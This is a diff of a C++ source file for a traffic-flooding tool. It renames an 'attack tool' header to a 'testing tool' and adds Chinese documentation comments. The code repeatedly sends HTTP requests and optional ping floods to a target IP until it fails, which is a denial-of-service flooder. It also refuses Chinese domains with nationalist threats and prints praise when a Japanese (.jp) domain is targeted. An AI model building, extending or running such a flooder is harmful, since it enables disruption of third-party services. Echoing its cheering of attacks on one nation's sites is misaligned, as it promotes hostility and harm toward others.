@@ -1,6 +1,23 @@
 /**
- * 网络流量攻击工具头文件
+ * 网络流量测试工具实现文件
+ *
+ * 功能说明：
+ * 1. 支持HTTP和PING两种测试模式
+ * 2. 自动检测和过滤中国域名
+ * 3. 支持域名解析为IP地址
+ * 4. 提供详细的请求响应信息
+ * 5. 包含测试模式和正常模式
+ *
+ * 安全特性：
+ * 1. 内置中国域名保护机制
+ * 2. 请求超时保护
+ * 3. 错误处理和恢复机制
+ *
+ * 作者：钟智强
+ * 版本：1.0.0
+ * 最后更新：2024-01
  */
+
 #include "TrafficFlood.h"
 
 #include "PingFlood.h"
@@ -24,20 +41,31 @@
 #include <thread>
 
 /**
- * 测试模式开关
- * true: 仅发送3次请求
- * false: 持续发送请求直到失败
+ * 全局配置变量
+ * isTest: 测试模式开关
+ *   - true:  仅发送3次请求，用于功能验证
+ *   - false: 持续发送请求直到失败，用于实际测试
+ *
+ * isPing: PING测试开关
+ *   - true:  同时发送HTTP请求和PING请求
+ *   - false: 仅发送HTTP请求
  */
 bool isTest = false;
+bool isPing = false;
 
 /**
  * cURL响应数据处理回调函数
- * 当libcurl接收到服务器响应数据时会调用此函数
- * @param contents 接收到的原始数据指针
- * @param size 每个数据块的大小
- * @param nmemb 数据块的数量
- * @param output 用于存储响应数据的字符串指针
- * @return 实际处理的数据字节数
+ *
+ * 工作流程：
+ * 1. 接收服务器返回的数据块
+ * 2. 将数据追加到输出缓冲区
+ * 3. 返回实际处理的数据大小
+ *
+ * @param contents 服务器返回的数据块指针
+ * @param size     单个数据项的大小
+ * @param nmemb    数据项的数量
+ * @param output   输出缓冲区指针
+ * @return         实际处理的总字节数
  */
 size_t WriteCallback(void* contents, size_t size, size_t nmemb,
                      std::string* output) {
@@ -47,10 +75,15 @@ size_t WriteCallback(void* contents, size_t size, size_t nmemb,
 }
 
 /**
- * 加载动画显示函数
- * 使用Unicode字符显示旋转动画效果
- * 用于提供视觉反馈，表示程序正在执行
- * @param message 要显示的提示信息
+ * 进度显示动画
+ *
+ * 特性：
+ * 1. 使用Unicode字符实现平滑动画效果
+ * 2. 支持自定义提示信息
+ * 3. 自动循环播放
+ * 4. 不影响其他输出
+ *
+ * @param message 要显示的提示文本
  */
 void showSpinner(const std::string& message) {
     static const char spinner[] = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏";
@@ -65,6 +98,15 @@ void clearLine() { std::cout << "\r\033[K" << std::flush; }
 
 /**
  * 流量发送主函数
+ *
+ * 执行流程：
+ * 1. 检查目标域名是否为受保护的中国域名
+ * 2. 将域名解析为IP地址
+ * 3. 规范化URL格式
+ * 4. 根据测试模式选择执行策略
+ * 5. 发送HTTP请求和可选的PING请求
+ * 6. 实时显示执行进度和结果
+ *
  * @param url 目标网址
  */
 void TrafficFlood::Flood(std::string url) {
@@ -82,7 +124,31 @@ void TrafficFlood::Flood(std::string url) {
         std::cout << "\033[31m|> 流量攻击已被禁用\033[0m" << std::endl;
         std::cout << "\033[31m|> 中国人不攻击中国人，你知道吗？\033[0m"
                   << std::endl;
+        std::cout << "\033[31m|> "
+                     "我们是中国人，绝不攻击自己的同胞！这是不可触碰的底线，你"
+                     "明白吗？\033[0m"
+                  << std::endl;
+        std::cout
+            << "\033[31m|> "
+               "任何试图违背这一原则的行为，都将被视为对整个社区的威胁！\033[0m"
+            << std::endl;
+        std::cout << "\033[31m|> "
+                     "系统已启动最高级别监控，任何违规行为都将被记录并受到最严"
+                     "厉的制裁！\033[0m"
+                  << std::endl;
+        std::cout
+            << "\033[31m|> "
+               "请立即停止一切不当行为，否则你将承担不可挽回的后果！\033[0m"
+            << std::endl;
+        std::cout
+            << "\033[31m|> "
+               "这是最后的警告，希望你能清楚地认识到自己的行为后果！\033[0m"
+            << std::endl;
     } else {
+        if (url.find(".jp") != std::string::npos) {
+            std::cout << "\033[31m|> 好样的！\033[0m" << std::endl;
+        }
+
         int counter = 0;
 
         std::string ip = URL_TO_IP(url);
@@ -108,7 +174,10 @@ void TrafficFlood::Flood(std::string url) {
                     break;
                 } else {
                     HttpRequest(ip);
-                    PingFlood::SendPing(ip);
+
+                    if (isPing) {
+                        PingFlood::SendPing(ip);
+                    }
                 }
 
                 counter++;
@@ -132,7 +201,10 @@ void TrafficFlood::Flood(std::string url) {
                     break;
                 } else {
                     HttpRequest(ip);
-                    PingFlood::SendPing(ip);
+
+                    if (isPing) {
+                        PingFlood::SendPing(ip);
+                    }
                 }
 
                 counter++;
@@ -142,8 +214,22 @@ void TrafficFlood::Flood(std::string url) {
 }
 
 /**
- * 发送HTTP请求
- * @param url 目标网址
+ * HTTP请求发送函数
+ *
+ * 功能特性：
+ * 1. 自动初始化cURL会话
+ * 2. 配置请求参数和回调函数
+ * 3. 执行请求并处理响应
+ * 4. 提供详细的响应信息显示
+ * 5. 自动清理资源
+ *
+ * 响应信息包括：
+ * - HTTP状态码
+ * - 内容类型
+ * - Cookie信息
+ * - 错误信息（如果有）
+ *
+ * @param url 目标URL
  * @return 0表示成功，1表示失败
  */
 int TrafficFlood::HttpRequest(std::string url) {
@@ -226,8 +312,20 @@ int TrafficFlood::HttpRequest(std::string url) {
 
 /**
  * 将URL转换为IP地址
+ *
+ * 解析步骤：
+ * 1. 初始化cURL会话
+ * 2. 清理URL格式（移除协议前缀和路径）
+ * 3. 执行DNS解析
+ * 4. 提取IP地址
+ * 5. 清理资源
+ *
+ * 错误处理：
+ * - 如果解析失败，返回原始URL
+ * - 自动处理各种URL格式
+ *
  * @param url 输入的URL
- * @return 解析后的IP地址，如果解析失败则返回原始URL
+ * @return 解析得到的IP地址或原始URL
  */
 std::string TrafficFlood::URL_TO_IP(std::string url) {
     CURL* curl = curl_easy_init();
@@ -264,12 +362,18 @@ std::string TrafficFlood::URL_TO_IP(std::string url) {
 
 /**
  * URL可访问性检查函数
- * 验证目标URL是否可以访问
- * 特点：
- * 1. 使用HEAD请求提高效率
+ *
+ * 检查方法：
+ * 1. 发送HEAD请求（仅获取头信息）
  * 2. 设置5秒超时限制
- * 3. 支持自动跟随重定向
- * 4. 通过HTTP状态码判断可访问性
+ * 3. 允许自动跟随重定向
+ * 4. 分析HTTP状态码
+ *
+ * 状态码判断：
+ * - 2xx: 成功
+ * - 3xx: 重定向（自动处理）
+ * - 4xx/5xx: 失败
+ *
  * @param url 要检查的URL
  * @return true表示可访问，false表示不可访问
  */
